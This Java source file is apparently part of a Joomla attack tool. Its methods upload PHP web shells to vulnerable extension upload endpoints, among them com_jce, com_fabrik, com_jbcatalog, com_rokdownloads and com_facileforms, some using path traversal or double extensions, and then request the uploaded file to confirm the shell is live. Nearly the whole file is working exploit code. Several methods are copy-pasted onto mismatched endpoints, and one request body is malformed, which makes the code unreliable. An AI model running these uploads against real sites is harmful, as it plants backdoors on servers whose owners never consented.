package com.funtap.awass.Exploit;

import com.funtap.awass.Exploit.Result.Result;
import net.minidev.json.JSONUtil;
import okhttp3.*;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;

public class joomla_exploit {
    public Result com_jce(String domain, String cookie) {
        Result result = new Result();
        try {
            String endpoint = domain + "/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20";
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .followRedirects(false)
                    .build();
            MediaType mediaType = MediaType.parse("form-data");
            // change
            RequestBody body = RequestBody.create(mediaType, "{\"upload-dir\":\"./../../\",\"upload-overwrite\":0,\"Filedata\" : \"shell/VulnX.gif\",\"action\":\"Upload\"}");
            Request request = null;
            if (cookie == null) {
                request = new Request.Builder()
                        // change
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .addHeader("User-Agent", "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801")
                        .build();
            } else {
                request = new Request.Builder()
                        //change
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .addHeader("User-Agent", "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801")
                        .addHeader("Cookie", cookie)
                        .build();
            }
            Response response = client.newCall(request).execute();
            //detect
            String dump_data = domain + "/VulnX.gif";//change
            client = new OkHttpClient().newBuilder()
                    .followRedirects(false)
                    .build();
            if (cookie == null) {
                request = new Request.Builder()
                        //change
                        .url(dump_data)
                        .method("GET", null)
                        .build();
            } else {
                request = new Request.Builder()
                        //change
                        .url(dump_data)
                        .method("GET", null)
                        .addHeader("Cookie", cookie)
                        .build();
            }
            response = client.newCall(request).execute();
            String html = response.body().string();
            if (html.contains("/image/gif/")) {
                //change
                result = new Result(dump_data, "com_jce", true, "VulnX.gif");
            } else {
                //change
                result = new Result(dump_data, "com_jce", false, "VulnX.gif");
            }
        } catch (Exception e) {
            System.out.println(e.getMessage());
        }
        return result;
    }

    public Result com_media(String domain, String cookie) {
        Result result = new Result();
        try {
            String endpoint = domain + "/index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder=";
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .followRedirects(false)
                    .build();
            MediaType mediaType = MediaType.parse("form-data");
            RequestBody body = RequestBody.create(mediaType, "{\"Filedata[]\":\"shell/VulnX.txt\"}");
            Request request = null;
            if (cookie == null) {
                request = new Request.Builder()
                        //change
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("User-Agent", "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801")
                        .addHeader("content-type", "form-data")
                        .build();
            } else {
                request = new Request.Builder()
                        //change
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("User-Agent", "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801")
                        .addHeader("content-type", "form-data")
                        .addHeader("Cookie", cookie)
                        .build();
            }
            Response response = client.newCall(request).execute();
            //detect
            String dump_data = domain + "/images/XAttacker.txt";//change
            client = new OkHttpClient().newBuilder()
                    .followRedirects(false)
                    .build();
            if (cookie == null) {
                request = new Request.Builder()
                        //change
                        .url(dump_data)
                        .method("GET", null)
                        .build();
            } else {
                request = new Request.Builder()
                        //change
                        .url(dump_data)
                        .method("GET", null)
                        .addHeader("Cookie", cookie)
                        .build();
            }
            response = client.newCall(request).execute();
            String html = response.body().string();
            if (html.contains("Tig")) {
                //change
                result = new Result(dump_data, "com_media", true, "VulnX.txt");
            } else {
                //change
                result = new Result(dump_data, "com_media", false, "VulnX.txt");
            }
        } catch (Exception e) {
            System.out.println(e.getMessage());
        }
        return result;
    }

    public Result com_fabrika(String domain, String cookie) {
        Result result = new Result();
        try {
            String endpoint = domain + "/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload";
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .followRedirects(false)
                    .build();
            MediaType mediaType = MediaType.parse("form-data");
            RequestBody body = RequestBody.create(mediaType, "{\"file\":\"shell/VulnX.php\"}");
            Request request = null;
            if (cookie == null) {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("content-type", "form-data")
                        .build();
            } else {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("content-type", "form-data")
                        .addHeader("Cookie", cookie)
                        .build();
            }
            Response response = client.newCall(request).execute();
            //detect
            String dump_data = domain + "/images/XAttacker.txt";//change
            client = new OkHttpClient().newBuilder()
                    .followRedirects(false)
                    .build();
            if (cookie == null) {
                request = new Request.Builder()
                        //change
                        .url(dump_data)
                        .method("GET", null)
                        .build();
            } else {
                request = new Request.Builder()
                        //change
                        .url(dump_data)
                        .method("GET", null)
                        .addHeader("Cookie", cookie)
                        .build();
            }
            response = client.newCall(request).execute();
            String html = response.body().string();
            if (html.contains("Vuln X")) {
                //change
                result = new Result(dump_data, "com_fabrika", true, "VulnX.php");
            } else {
                //change
                result = new Result(dump_data, "com_fabrika", false, "VulnX.php");
            }
        } catch (Exception e) {
            System.out.println(e.getMessage());
        }
        return result;
    }

    public Result com_fabrikb(String domain, String cookie) {
        Result result = new Result();
        try {
            String endpoint = domain + "/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload";
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .followRedirects(false)
                    .build();
            MediaType mediaType = MediaType.parse("form-data");
            RequestBody body = RequestBody.create(mediaType, "{\"file\":\"shell/VulnX.txt\"}");
            Request request = null;
            if (cookie == null) {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("content-type", "form-data")
                        .build();
            } else {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("content-type", "form-data")
                        .addHeader("Cookie", cookie)
                        .build();
            }
            Response response = client.newCall(request).execute();
            //detect
            String dump_data = domain + "/images/XAttacker.txt";//change
            client = new OkHttpClient().newBuilder()
                    .followRedirects(false)
                    .build();
            if (cookie == null) {
                request = new Request.Builder()
                        //change
                        .url(dump_data)
                        .method("GET", null)
                        .build();
            } else {
                request = new Request.Builder()
                        //change
                        .url(dump_data)
                        .method("GET", null)
                        .addHeader("Cookie", cookie)
                        .build();
            }
            response = client.newCall(request).execute();
            String html = response.body().string();
            if (html.contains("Tig")) {
                //change
                result = new Result(dump_data, "com_fabrik2", true, "VulnX.txt");
            } else {
                //change
                result = new Result(dump_data, "com_fabrik2", false, "VulnX.txt");
            }
        } catch (Exception e) {
            System.out.println(e.getMessage());
        }
        return result;
    }

    public Result com_foxcontact(String domain, String cookie) {
        Result result = new Result();
        try {
            String endpoint = domain + "/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload";
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .followRedirects(false)
                    .build();
            MediaType mediaType = MediaType.parse("form-data");
            RequestBody body = RequestBody.create(mediaType, "{\"file\":\"shell/VulnX.txt\"}");
            Request request = null;
            if (cookie == null) {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("content-type", "form-data")
                        .build();
            } else {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("content-type", "form-data")
                        .addHeader("Cookie", cookie)
                        .build();
            }
            Response response = client.newCall(request).execute();
            //detect
            String dump_data = domain + "/images/XAttacker.txt";//change
            client = new OkHttpClient().newBuilder()
                    .followRedirects(false)
                    .build();
            if (cookie == null) {
                request = new Request.Builder()
                        //change
                        .url(dump_data)
                        .method("GET", null)
                        .build();
            } else {
                request = new Request.Builder()
                        //change
                        .url(dump_data)
                        .method("GET", null)
                        .addHeader("Cookie", cookie)
                        .build();
            }
            response = client.newCall(request).execute();
            String html = response.body().string();
            if (html.contains("Tig")) {
                //change
                result = new Result(dump_data, "com_fabrik2", true, "VulnX.txt");
            } else {
                //change
                result = new Result(dump_data, "com_fabrik2", false, "VulnX.txt");
            }
        } catch (Exception e) {
            System.out.println(e.getMessage());
        }
        return result;
    }

    public Result com_adsmanager(String domain, String cookie) {
        Result result = new Result();
        try {
            String endpoint = domain + "/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload";
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .followRedirects(false)
                    .build();
            MediaType mediaType = MediaType.parse("text/plain");
            RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("image", "/D:/project/vulnx/shell/VulnX.php",
                            RequestBody.create(MediaType.parse("application/octet-stream"),
                                    new File("/D:/project/vulnx/shell/VulnX.php")))
                    .build();
            Request request = null;
            if (cookie == null) {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("content-type", "form-data")
                        .build();
            } else {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("content-type", "form-data")
                        .addHeader("Cookie", cookie)
                        .build();
            }
            Response response = client.newCall(request).execute();
            //detect
            String dump_data = domain + "/tmp/plupload/VulnX.html";//change
            client = new OkHttpClient().newBuilder()
                    .followRedirects(false)
                    .build();
            if (cookie == null) {
                request = new Request.Builder()
                        //change
                        .url(dump_data)
                        .method("GET", null)
                        .build();
            } else {
                request = new Request.Builder()
                        //change
                        .url(dump_data)
                        .method("GET", null)
                        .addHeader("Cookie", cookie)
                        .build();
            }
            response = client.newCall(request).execute();
            String html = response.body().string();
            if (html.contains("VulnX")) {
                //change
                result = new Result(dump_data, "com_adsmanager", true, "VulnX.php");
            } else {
                //change
                result = new Result(dump_data, "com_adsmanager", false, "VulnX.php");
            }
        } catch (Exception e) {
            System.out.println(e.getMessage());
        }
        return result;
    }

    public Result com_blog(String domain, String cookie) {
        Result result = new Result();
        try {
            String endpoint = domain + "/index.php?option=com_myblog&task=ajaxupload";
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .followRedirects(false)
                    .build();
            Request request = null;
            if (cookie == null) {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("GET", null)
                        .addHeader("Accept", "*/*")
                        .addHeader("Accept-Encoding", "gzip, deflate")
                        .build();
            } else {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("GET", null)
                        .addHeader("Accept", "*/*")
                        .addHeader("Accept-Encoding", "gzip, deflate")
                        .build();
            }
            Response response = client.newCall(request).execute();
            //detect
            String html = response.body().string();
            if (html.contains("has been uploaded")) {
                //change
                result = new Result(endpoint, "com_blog", true, "");
            } else {
                //change
                result = new Result(endpoint, "com_blog", false, "");
            }
        } catch (Exception e) {
            System.out.println(e.getMessage());
        }
        return result;
    }

    public Result com_users(String domain, String cookie) {
        Result result = new Result();
        try {
            String endpoint = domain + "/index.php?option=com_users&view=registration";
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .followRedirects(false)
                    .build();
            Request request = null;
            if (cookie == null) {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("GET", null)
                        .addHeader("Accept", "*/*")
                        .addHeader("Accept-Encoding", "gzip, deflate")
                        .build();
            } else {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("GET", null)
                        .addHeader("Accept", "*/*")
                        .addHeader("Accept-Encoding", "gzip, deflate")
                        .build();
            }
            Response response = client.newCall(request).execute();
            //detect
            String html = response.body().string();
            if (html.contains("jform_email2-lbl")) {
                //change
                result = new Result(endpoint, "com_users", true, "");
            } else {
                //change
                result = new Result(endpoint, "com_users", false, "");
            }
        } catch (Exception e) {
            System.out.println(e.getMessage());
        }
        return result;
    }

    public Result comweblinks(String domain, String cookie) {
        Result result = new Result();
        try {
            String endpoint = domain + "/index.php?option=com_media&view=images&tmpl=component&e_name=jform_description&asset=com_weblinks&author=";
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .followRedirects(false)
                    .build();
            MediaType mediaType = MediaType.parse("form-data");
            RequestBody body = RequestBody.create(mediaType, "{\"image[]\":\"shell/VulnX.gif\"}");
            Request request = null;
            if (cookie == null) {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("content-type", "form-data")
                        .build();
            } else {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("content-type", "form-data")
                        .addHeader("Cookie", cookie)
                        .build();
            }
            Response response = client.newCall(request).execute();
            //detect
            String dump_data = domain + "/images/VulnX.gif";//change
            client = new OkHttpClient().newBuilder()
                    .followRedirects(false)
                    .build();
            if (cookie == null) {
                request = new Request.Builder()
                        //change
                        .url(dump_data)
                        .method("GET", null)
                        .build();
            } else {
                request = new Request.Builder()
                        //change
                        .url(dump_data)
                        .method("GET", null)
                        .addHeader("Cookie", cookie)
                        .build();
            }
            response = client.newCall(request).execute();
            int code = response.code();

            if (code == 200) {
                //change
                result = new Result(dump_data, "comweblinks", true, "VulnX.gif");
            } else {
                //change
                result = new Result(dump_data, "comweblinks", false, "VulnX.gif");
            }
        } catch (Exception e) {
            System.out.println(e.getMessage());
        }
        return result;
    }

    public Result mod_simplefileupload(String domain, String cookie) {
        String dump_data = domain + "/components/com_jbcatalog/libraries/jsupload/server/php/files/VulnX.php?Vuln=X";//change
        Result result = new Result(dump_data, "mod_simplefileupload", false, "VulnX.php.mp4");
        try {
            String endpoint = domain + "/modules/mod_simplefileuploadv1.3/elements/udd.php";
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .followRedirects(false)
                    .build();
            MediaType mediaType = MediaType.parse("application/x-www-form-urlencoded");
            RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("image[]","shell/VulnX.php.mp4",
                            RequestBody.create(MediaType.parse("application/octet-stream"),
                                    new File("/D:/project/vulnx/shell/VulnX.php")))
                    .build();
            Request request = null;
            if (cookie == null) {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("content-type", "application/x-www-form-urlencoded")
                        .build();
            } else {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("content-type", "application/x-www-form-urlencoded")
                        .addHeader("Cookie", cookie)
                        .build();
            }
            Response response = client.newCall(request).execute();
            //detect
            client = new OkHttpClient().newBuilder()
                    .followRedirects(false)
                    .build();
            if (cookie == null) {
                request = new Request.Builder()
                        //change
                        .url(dump_data)
                        .method("GET", null)
                        .build();
            } else {
                request = new Request.Builder()
                        //change
                        .url(dump_data)
                        .method("GET", null)
                        .addHeader("Cookie", cookie)
                        .build();
            }
            response = client.newCall(request).execute();
            String html = response.body().string();

            if (html.contains("Vuln X")) {
                //change
                result = new Result(dump_data, "mod_simplefileupload", true, "VulnX.php.mp4");
            } else {
                //change
                result = new Result(dump_data, "mod_simplefileupload", false, "VulnX.php.mp4");
            }
        } catch (Exception e) {
            System.out.println("com_jbcatalog error");
        }
        return result;
    }

    public Result com_jbcatalog(String domain, String cookie) {
        String dump_data = domain + "/components/com_jbcatalog/libraries/jsupload/server/php/files/VulnX.php?Vuln=X";//change
        Result result = new Result(dump_data, "com_jbcatalog", false, "VulnX.php");
        try {
            String endpoint = domain + "/components/com_jbcatalog/libraries/jsupload/server/php";
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .followRedirects(false)
                    .build();
            MediaType mediaType = MediaType.parse("application/x-www-form-urlencoded");
            RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("image[]","/D:/project/vulnx/shell/VulnX.php",
                            RequestBody.create(MediaType.parse("application/octet-stream"),
                                    new File("/D:/project/vulnx/shell/VulnX.php")))
                    .build();
            Request request = null;
            if (cookie == null) {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("content-type", "application/x-www-form-urlencoded")
                        .build();
            } else {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("content-type", "application/x-www-form-urlencoded")
                        .addHeader("Cookie", cookie)
                        .build();
            }
            Response response = client.newCall(request).execute();
            //detect
            client = new OkHttpClient().newBuilder()
                    .followRedirects(false)
                    .build();
            if (cookie == null) {
                request = new Request.Builder()
                        //change
                        .url(dump_data)
                        .method("GET", null)
                        .build();
            } else {
                request = new Request.Builder()
                        //change
                        .url(dump_data)
                        .method("GET", null)
                        .addHeader("Cookie", cookie)
                        .build();
            }
            response = client.newCall(request).execute();
            String html = response.body().string();

            if (html.contains("Vuln X")) {
                //change
                result = new Result(dump_data, "com_jbcatalog", true, "VulnX.gif");
            } else {
                //change
                result = new Result(dump_data, "com_jbcatalog", false, "VulnX.gif");
            }
        } catch (Exception e) {
            System.out.println("com_jbcatalog error");
        }
        return result;
    }

    public Result com_sexycontactform(String domain, String cookie) {
        String dump_data = domain + "/com_sexycontactform/fileupload/files/files/VulnX.php?Vuln=X";//change
        Result result = new Result(dump_data, "com_sexycontactform", false, "VulnX.gif");
        try {
            String endpoint = domain + "/components/com_jbcatalog/libraries/jsupload/server/php";
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .followRedirects(false)
                    .build();
            MediaType mediaType = MediaType.parse("application/x-www-form-urlencoded");
            RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("image[]","/D:/project/vulnx/shell/VulnX.php",
                            RequestBody.create(MediaType.parse("application/octet-stream"),
                                    new File("/D:/project/vulnx/shell/VulnX.php")))
                    .build();
            Request request = null;
            if (cookie == null) {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("content-type", "application/x-www-form-urlencoded")
                        .build();
            } else {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("content-type", "application/x-www-form-urlencoded")
                        .addHeader("Cookie", cookie)
                        .build();
            }
            Response response = client.newCall(request).execute();
            //detect
            client = new OkHttpClient().newBuilder()
                    .followRedirects(false)
                    .build();
            if (cookie == null) {
                request = new Request.Builder()
                        //change
                        .url(dump_data)
                        .method("GET", null)
                        .build();
            } else {
                request = new Request.Builder()
                        //change
                        .url(dump_data)
                        .method("GET", null)
                        .addHeader("Cookie", cookie)
                        .build();
            }
            response = client.newCall(request).execute();
            String html = response.body().string();

            if (html.contains("Vuln X")) {
                //change
                result = new Result(dump_data, "com_sexycontactform", true, "VulnX.php");
            } else {
                //change
                result = new Result(dump_data, "com_sexycontactform", false, "VulnX.php");
            }
        } catch (Exception e) {
            System.out.println("com_jbcatalog error");
        }
        return result;
    }

    public Result com_rokdownloads(String domain, String cookie) {
        String dump_data = domain + "/images/stories/VulnX.php?Vuln=X";//change
        Result result = new Result(dump_data, "com_sexycontactform", false, "VulnX.php");
        try {
            String endpoint = domain + "/administrator/components/com_rokdownloads/assets/uploadhandler.php";
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .followRedirects(false)
                    .build();
            MediaType mediaType = MediaType.parse("application/x-www-form-urlencoded");
            RequestBody body = RequestBody.create(mediaType, "{\"Filedata\":\"shell/VulnX.php\",\"jpath\" : \"..%2F..%2F..%2F..%2F\"}");
            Request request = null;
            if (cookie == null) {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("content-type", "application/x-www-form-urlencoded")
                        .build();
            } else {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("content-type", "application/x-www-form-urlencoded")
                        .addHeader("Cookie", cookie)
                        .build();
            }
            Response response = client.newCall(request).execute();
            //detect
            client = new OkHttpClient().newBuilder()
                    .followRedirects(false)
                    .build();
            if (cookie == null) {
                request = new Request.Builder()
                        //change
                        .url(dump_data)
                        .method("GET", null)
                        .build();
            } else {
                request = new Request.Builder()
                        //change
                        .url(dump_data)
                        .method("GET", null)
                        .addHeader("Cookie", cookie)
                        .build();
            }
            response = client.newCall(request).execute();
            String html = response.body().string();

            if (html.contains("Vuln X")) {
                //change
                result = new Result(dump_data, "com_rokdownloads", true, "VulnX.php");
            } else {
                //change
                result = new Result(dump_data, "com_rokdownloads", false, "VulnX.php");
            }
        } catch (Exception e) {
            System.out.println("com_rokdownloads error");
        }
        return result;
    }

    public Result com_extplorer(String domain, String cookie) {
        String dump_data = domain + "/images/stories/VulnX.php?Vuln=X";//change
        Result result = new Result(dump_data, "com_extplorer", false, "VulnX.php");
        try {
            String endpoint = domain + "/administrator/components/com_rokdownloads/assets/uploadhandler.php";
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .followRedirects(false)
                    .build();
            MediaType mediaType = MediaType.parse("application/x-www-form-urlencoded");
            RequestBody body = RequestBody.create(mediaType, "{\"Filedata\":\"shell/VulnX.php\"");
            Request request = null;
            if (cookie == null) {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("content-type", "application/x-www-form-urlencoded")
                        .build();
            } else {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("content-type", "application/x-www-form-urlencoded")
                        .addHeader("Cookie", cookie)
                        .build();
            }
            Response response = client.newCall(request).execute();
            //detect
            client = new OkHttpClient().newBuilder()
                    .followRedirects(false)
                    .build();
            if (cookie == null) {
                request = new Request.Builder()
                        //change
                        .url(dump_data)
                        .method("GET", null)
                        .build();
            } else {
                request = new Request.Builder()
                        //change
                        .url(dump_data)
                        .method("GET", null)
                        .addHeader("Cookie", cookie)
                        .build();
            }
            response = client.newCall(request).execute();
            String html = response.body().string();

            if (html.contains("Vuln X")) {
                //change
                result = new Result(dump_data, "com_extplorer", true, "VulnX.php");
            } else {
                //change
                result = new Result(dump_data, "com_extplorer", false, "VulnX.php");
            }
        } catch (Exception e) {
            System.out.println("com_extplorer error");
        }
        return result;
    }

    public Result com_jwallpapers(String domain, String cookie) {
        String dump_data = domain + "/jwallpapers_files/plupload/VulnX.php?Vuln=X";//change
        Result result = new Result(dump_data, "com_jwallpapers", false, "VulnX.php");
        try {
            String endpoint = domain + "/index.php?option=com_jwallpapers&task=upload";
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .followRedirects(false)
                    .build();
            MediaType mediaType = MediaType.parse("application/x-www-form-urlencoded");
            RequestBody body = RequestBody.create(mediaType, "{\"Filedata\":\"shell/VulnX.php\",\"submit\" : \"Upload\"}");
            Request request = null;
            if (cookie == null) {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("content-type", "application/x-www-form-urlencoded")
                        .build();
            } else {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("content-type", "application/x-www-form-urlencoded")
                        .addHeader("Cookie", cookie)
                        .build();
            }
            Response response = client.newCall(request).execute();
            //detect
            client = new OkHttpClient().newBuilder()
                    .followRedirects(false)
                    .build();
            if (cookie == null) {
                request = new Request.Builder()
                        //change
                        .url(dump_data)
                        .method("GET", null)
                        .build();
            } else {
                request = new Request.Builder()
                        //change
                        .url(dump_data)
                        .method("GET", null)
                        .addHeader("Cookie", cookie)
                        .build();
            }
            response = client.newCall(request).execute();
            String html = response.body().string();

            if (html.contains("Vuln X")) {
                //change
                result = new Result(dump_data, "com_jwallpapers", true, "VulnX.php");
            } else {
                //change
                result = new Result(dump_data, "com_jwallpapers", false, "VulnX.php");
            }
        } catch (Exception e) {
            System.out.println("com_jwallpapers error");
        }
        return result;
    }

    public Result com_facileforms(String domain, String cookie) {
        String dump_data = domain + "/components/com_facileforms/libraries/jquery/VulnX.php?Vuln=X";//change
        Result result = new Result(dump_data, "com_facileforms", false, "VulnX.php");
        try {
            String endpoint = domain + "/components/com_facileforms/libraries/jquery/uploadify.php";
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .followRedirects(false)
                    .build();
            MediaType mediaType = MediaType.parse("application/x-www-form-urlencoded");
            RequestBody body = RequestBody.create(mediaType, "{\"Filedata\":\"shell/VulnX.php\",\"folder\" : \"/components/com_facileforms/libraries/jquery/\"}");
            Request request = null;
            if (cookie == null) {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("content-type", "application/x-www-form-urlencoded")
                        .build();
            } else {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("content-type", "application/x-www-form-urlencoded")
                        .addHeader("Cookie", cookie)
                        .build();
            }
            Response response = client.newCall(request).execute();
            //detect
            client = new OkHttpClient().newBuilder()
                    .followRedirects(false)
                    .build();
            if (cookie == null) {
                request = new Request.Builder()
                        //change
                        .url(dump_data)
                        .method("GET", null)
                        .build();
            } else {
                request = new Request.Builder()
                        //change
                        .url(dump_data)
                        .method("GET", null)
                        .addHeader("Cookie", cookie)
                        .build();
            }
            response = client.newCall(request).execute();
            String html = response.body().string();

            if (html.contains("Vuln X")) {
                //change
                result = new Result(dump_data, "com_facileforms", true, "VulnX.php");
            } else {
                //change
                result = new Result(dump_data, "com_facileforms", false, "VulnX.php");
            }
        } catch (Exception e) {
            System.out.println("com_facileforms error");
        }
        return result;
    }


}

